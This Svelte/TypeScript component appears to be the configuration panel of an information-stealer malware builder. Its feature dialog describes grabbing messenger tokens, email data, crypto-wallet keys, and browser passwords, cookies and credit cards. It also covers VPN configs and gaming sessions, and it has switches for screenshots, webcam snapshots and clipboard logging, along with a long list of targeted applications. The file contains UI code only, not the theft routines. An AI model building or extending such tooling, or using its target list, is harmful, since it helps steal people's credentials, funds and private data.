<script lang="ts">
  import { Button } from "$lib/components/ui/button";
  import {
    Accordion,
    AccordionContent,
    AccordionItem,
    AccordionTrigger,
  } from "$lib/components/ui/accordion";
  import {
    Dialog,
    DialogClose,
    DialogContent,
    DialogDescription,
    DialogFooter,
    DialogHeader,
    DialogOverlay,
    DialogPortal,
    DialogTitle,
    DialogTrigger,
  } from "$lib/components/ui/dialog";
  import { Label } from "$lib/components/ui/label";
  import { Switch } from "$lib/components/ui/switch";

  type Category = {
    id: string;
    label: string;
  };

  type FeatureDetail = {
    title: string;
    summary: string;
    items?: string[];
  };

  type Props = {
    categories?: Category[];
    categoryState?: Record<string, boolean>;
    selectedCategoryCount?: number;
    toggleCategory?: (id: string, checked: boolean) => void;
    showToast?: (message: string) => void;
    captureScreenshots?: boolean;
    captureWebcams?: boolean;
    captureClipboard?: boolean;
    onToggleScreenshots?: () => void;
    onToggleWebcams?: () => void;
    onToggleClipboard?: () => void;
  };

  const props = $props();

  let {
    categories = [],
    categoryState = {},
    selectedCategoryCount = 0,
    toggleCategory = () => undefined,
    showToast = () => undefined,
    captureScreenshots = false,
    captureWebcams = false,
    captureClipboard = false,
    onToggleScreenshots = () => undefined,
    onToggleWebcams = () => undefined,
    onToggleClipboard = () => undefined,
  } = props as Props;

    const featureLinks: Record<string, string> = {
    "Element": "https://element.io",
    ICQ: "https://icq.com",
    Signal: "https://signal.org",
    "Slack": "https://slack.com",
    Skype: "https://www.skype.com",
    "Telegram": "https://desktop.telegram.org",
    Tox: "https://tox.chat",
    Viber: "https://www.viber.com",
    "WhatsApp": "https://www.whatsapp.com/download",
    Pidgin: "https://pidgin.im",
    "Psi": "https://psi-im.org",
    Outlook: "https://www.microsoft.com/outlook",
    Thunderbird: "https://www.thunderbird.net",
    Mailbird: "https://www.getmailbird.com",
    Mailspring: "https://www.getmailspring.com",
    Ethereum: "https://ethereum.org/en/wallets/",
    "Electrum Wallets": "https://electrum.org",
    Dash: "https://www.dash.org",
    Bytecoin: "https://bytecoin.org",
    Bitcoin: "https://bitcoin.org/en/bitcoin-core/",
    "Atomic Wallet": "https://atomicwallet.io",
    Armory: "https://www.bitcoinarmory.com",
    Exodus: "https://www.exodus.com",
    Litecoin: "https://litecoin.com",
    Monero: "https://www.getmonero.org",
    Zcash: "https://z.cash",
    Coinomi: "https://www.coinomi.com",
    Guarda: "https://guarda.com",
    Zephyr: "https://zephyrwallet.io",
    "Trust Wallet": "https://www.trustwallet.com",
    "Ledger Live": "https://www.ledger.com/ledger-live",
    Phantom: "https://phantom.app",
    "Google Chrome": "https://www.google.com/chrome",
    "Microsoft Edge": "https://www.microsoft.com/edge",
    Brave: "https://brave.com",
    Opera: "https://www.opera.com",
    "Mozilla Firefox": "https://www.mozilla.org/firefox",
    SeaMonkey: "https://www.seamonkey-project.org",
    Waterfox: "https://www.waterfox.net",
    "Pale Moon": "https://www.palemoon.org",
    "Yandex": "https://browser.yandex.com",
    "360": "https://browser.360.cn",
    "QQ": "https://browser.qq.com",
    "Cốc Cốc": "https://coccoc.com",
    "Naver Whale": "https://whale.naver.com",
    "Arc": "https://arc.net",
    Vivaldi: "https://vivaldi.com",
    Chromium: "https://www.chromium.org",
    NordVPN: "https://nordvpn.com",
    ExpressVPN: "https://www.expressvpn.com",
    TunnelBear: "https://www.tunnelbear.com",
    WireGuard: "https://www.wireguard.com",
    OpenVPN: "https://openvpn.net",
    ProtonVPN: "https://proton.me/vpn",
    Steam: "https://store.steampowered.com",
    "Epic Games Launcher": "https://www.epicgames.com/store",
    "Battle.net": "https://www.blizzard.com",
    "Riot Client": "https://www.riotgames.com",
    "Ubisoft Connect": "https://www.ubisoft.com",
  };
const slugify = (value: string) =>
    value
      .toLowerCase()
      .replace(/[^a-z0-9]+/g, "-")
      .replace(/^-|-$/g, "");
  const iconSrc = (value: string) => `/logos/${slugify(value)}.svg`;
  const handleFeatureClick = (label: string) => {
    const link = featureLinks[label];
    if (!link || typeof window === "undefined") return;
    window.open(link, "_blank", "noopener");
  };

  const detailSections: FeatureDetail[] = [
    {
      title: "Messengers",
      summary: "Grabs tokens, cache, and local storage from every supported desktop messenger, including Jabber clients.",
      items: [
        "Element",
        "ICQ",
        "Signal",
        "Slack",
        "Skype",
        "Telegram",
        "Tox",
        "Viber",
        "WhatsApp",
        "Pidgin",
        "Psi",
      ],
    },
    {
      title: "Email Clients",
      summary: "Extracts profiles, cached mailboxes, and configuration from widely used email clients.",
      items: ["Outlook", "Thunderbird", "Mailbird", "Mailspring"],
    },
    {
      title: "Wallets",
      summary: "Crawls every monitored wallet/storage location and LevelDB store for encrypted keys and session metadata.",
      items: [
        "Ethereum",
        "Electrum Wallets",
        "Dash",
        "Bytecoin",
        "Bitcoin",
        "Atomic Wallet",
        "Armory",
        "Exodus",
        "Litecoin",
        "Monero",
        "Zcash",
        "Coinomi",
        "Guarda",
        "Zephyr",
        "Trust Wallet",
      ],
    },
    {
      title: "Browsers",
      summary:
        "Collects bookmarks, cookies, history, passwords, autofill, and credit card data from every supported Chromium/Chromium-based browser.",
      items: [
        "Google Chrome",
        "Microsoft Edge",
        "Mozilla Firefox",
        "Opera",
        "Brave",
        "Vivaldi",
        "Yandex",
        "360",
        "QQ",
        "Cốc Cốc",
        "Naver Whale",
        "SeaMonkey",
        "Waterfox",
        "Pale Moon",
        "Arc",
        "Chromium",
      ],
    },
    {
      title: "VPNs & Services",
      summary: "Gathers configuration files, logs, and recent connections from common VPN clients and services.",
      items: ["NordVPN", "ExpressVPN", "TunnelBear", "WireGuard", "OpenVPN", "ProtonVPN"],
    },
    {
      title: "Gaming & Extras",
      summary: "Scrapes gaming platform clients for session data and extra recovery artifacts.",
      items: ["Steam", "Epic Games Launcher", "Battle.net", "Riot Client", "Ubisoft Connect"],
    },
    {
      title: "Screenshots",
      summary: "Captures every active monitor in the Windows session as PNG artifacts.",
    },
    {
      title: "Webcam",
      summary: "Snapshots one frame per detected webcam device (auto depends on drivers and permissions).",
    },
    {
      title: "Clipboard",
      summary: "Logs plaintext/Unicode text and bitmap image data currently stored in the Windows clipboard.",
    },
  ];

  const handleCategoryToggle = (id: string) => {
    const nextValue = !categoryState[id];
    if (!nextValue && selectedCategoryCount <= 1 && categoryState[id]) {
      showToast("At least one category must stay enabled.");
      return;
    }
    toggleCategory(id, nextValue);
  };
</script>

<div class="space-y-4">
  <div class="flex items-center gap-2 text-sm uppercase tracking-[0.2em] text-muted-foreground">
    <span class="text-primary">Features</span>
    <div class="flex justify-end">
      <Dialog>
        <DialogTrigger>
          <Button variant="link" size="sm" class="h-auto p-0 text-[10px] uppercase tracking-widest">
            What’s included?
          </Button>
        </DialogTrigger>
        <DialogPortal>
          <DialogOverlay class="bg-black/50 data-[state=open]:animate-fade-in" />
          <DialogContent class="max-h-[85vh] w-[min(90vw,640px)] space-y-6 overflow-y-auto rounded-xl bg-background p-6 shadow-lg data-[state=open]:animate-slide-in scrollbar-thin scrollbar-thumb-border scrollbar-track-muted">
            <DialogHeader>
              <DialogTitle>What’s included?</DialogTitle>
              <DialogDescription>Toggle categories and feature switches to include the artifacts listed below.</DialogDescription>
            </DialogHeader>
            <div class="flex flex-col gap-3">
              <Accordion type="single" class="space-y-3">
                {#each detailSections as section (section.title)}
                  <AccordionItem
                    class="border border-border/60 bg-muted/30 rounded-lg"
                    value={section.title}
                  >
                    <AccordionTrigger class="flex w-full items-center justify-between gap-2 rounded-lg px-4 py-3 text-sm font-semibold hover:bg-muted/60">
                      <span>{section.title}</span>
                      <span class="text-xs uppercase tracking-[0.3em] text-muted-foreground">
                        {section.items?.length ? `${section.items.length} items` : "Info"}
                      </span>
                    </AccordionTrigger>
                    <AccordionContent class="px-4 pb-3 pt-1 text-xs text-muted-foreground">
                      <p class="text-sm text-muted-foreground">{section.summary}</p>
                      {#if section.items}
                        <div class="mt-3 grid gap-2 text-[0.75rem] md:grid-cols-2">
                          {#each section.items as item}
                            <Button
                              variant="secondary"
                              size="sm"
                              class="flex-1 gap-2 overflow-hidden whitespace-nowrap text-xs font-medium"
                              type="button"
                              disabled={!featureLinks[item]}
                              aria-label={featureLinks[item] ? `Open ${item} site` : item}
                              onclick={() => handleFeatureClick(item)}
                            >
                              <img
                                src={iconSrc(item)}
                                alt=""
                                loading="lazy"
                                class="h-4 w-auto shrink-0 object-contain"
                              />
                              <span class="truncate">{item}</span>
                            </Button>
                          {/each}
                        </div>
                      {/if}
                    </AccordionContent>
                  </AccordionItem>
                {/each}
              </Accordion>
            </div>
          </DialogContent>
        </DialogPortal>
      </Dialog>
    </div>
  </div>
  <p class="text-xs text-muted-foreground">
    Toggle categories to include. At least one category must stay enabled.
  </p>
  <div class="grid gap-3 sm:grid-cols-2 lg:grid-cols-3">
    {#each categories as category}
      <div
        class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
        role="button"
        tabindex="0"
        onclick={(event) => {
          const target = event.target as HTMLElement | null;
          if (target?.closest?.("[data-category-switch]")) return;
          handleCategoryToggle(category.id);
        }}
        onkeydown={(event) => {
          if (event.key === "Enter" || event.key === " ") {
            event.preventDefault();
            handleCategoryToggle(category.id);
          }
        }}
      >
        <Label class="text-sm">{category.label}</Label>
        <Switch
          id={`category-${category.id}`}
          data-category-switch
          class="cursor-pointer"
          checked={categoryState[category.id]}
          onclick={(event) => {
            if (categoryState[category.id] && selectedCategoryCount <= 1) {
              event.preventDefault();
              event.stopPropagation();
              showToast("At least one category must stay enabled.");
            }
          }}
          onCheckedChange={() => handleCategoryToggle(category.id)}
        />
      </div>
    {/each}
    <div
      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
      role="button"
      tabindex="0"
      onclick={(event) => {
        const target = event.target as HTMLElement | null;
        if (target?.closest?.("[data-feature-switch]")) return;
        onToggleScreenshots();
      }}
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          onToggleScreenshots();
        }
      }}
    >
      <div class="space-y-0.5">
        <Label class="text-sm">Screenshot</Label>
      </div>
      <Switch data-feature-switch class="cursor-pointer" checked={captureScreenshots} />
    </div>
    <div
      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
      role="button"
      tabindex="0"
      onclick={(event) => {
        const target = event.target as HTMLElement | null;
        if (target?.closest?.("[data-feature-switch]")) return;
        onToggleWebcams();
      }}
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          onToggleWebcams();
        }
      }}
    >
      <div class="space-y-0.5">
        <Label class="text-sm">Webcam</Label>
      </div>
      <Switch data-feature-switch class="cursor-pointer" checked={captureWebcams} />
    </div>
    <div
      class="flex items-center justify-between gap-3 rounded-md border border-border/70 bg-muted/30 px-3 py-2 text-sm cursor-pointer"
      role="button"
      tabindex="0"
      onclick={(event) => {
        const target = event.target as HTMLElement | null;
        if (target?.closest?.("[data-feature-switch]")) return;
        onToggleClipboard();
      }}
      onkeydown={(event) => {
        if (event.key === "Enter" || event.key === " ") {
          event.preventDefault();
          onToggleClipboard();
        }
      }}
    >
      <div class="space-y-0.5">
        <Label class="text-sm">Clipboard</Label>
      </div>
      <Switch data-feature-switch class="cursor-pointer" checked={captureClipboard} />
    </div>
  </div>
</div>
